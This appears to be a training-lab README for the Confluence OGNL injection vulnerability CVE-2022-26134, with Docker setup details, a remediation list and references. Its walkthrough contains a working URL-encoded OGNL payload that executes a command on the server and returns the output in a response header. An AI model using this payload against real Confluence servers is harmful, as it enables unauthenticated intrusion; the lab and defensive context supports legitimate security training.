# Atlassian Confluence Server OGNL Injection Remote Code Execution (CVE-2022-26134)

## Overview

Atlassian Confluence Server and Data Center are enterprise team collaboration and wiki platforms. Vulnerability CVE-2022-26134 is an unauthenticated remote code execution flaw in the WebWork framework integration. Confluence evaluates incoming HTTP request URIs as Object-Graph Navigation Language (OGNL) expressions when an unmapped or error endpoint is accessed, granting instant root/confluence command execution via HTTP GET.

- **Service Access**: `http://localhost:8158/`
- **Default Credentials**: `Unauthenticated HTTP request URI`
- **Docker Shortcut**: `./lab start confluence-ognl-rce`
- **Container Name**: `cyberlab_04_confluence_ognl_rce`
- **RAM Footprint**: ~1200M

---

## Exploitation Walkthrough

### 1. Verify Confluence Web Console

```bash
curl -i http://localhost:8158/
```

### 2. Send OGNL Payload in URL Path

```bash
curl -v 'http://localhost:8158/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
```

### 3. Inspect Response Header

```bash
# The response header X-Cmd-Response contains uid=... gid=... output.
```

---

## Defensive Remediation & Hardening

1. Upgrade Confluence Server to versions 7.13.7, 7.18.1, 7.4.17, 7.14.3, 7.15.2, 7.16.4, 7.17.4 or newer.
2. Apply Atlassian security workaround patches to xwork-1.0.3-atlassian-10.jar.
3. Restrict network access to internal corporate subnets.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Atlassian Security Advisory CVE-2022-26134](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html)
- [Vulhub Confluence CVE-2022-26134 Environment](https://vulhub.org/#/environments/confluence/CVE-2022-26134/)
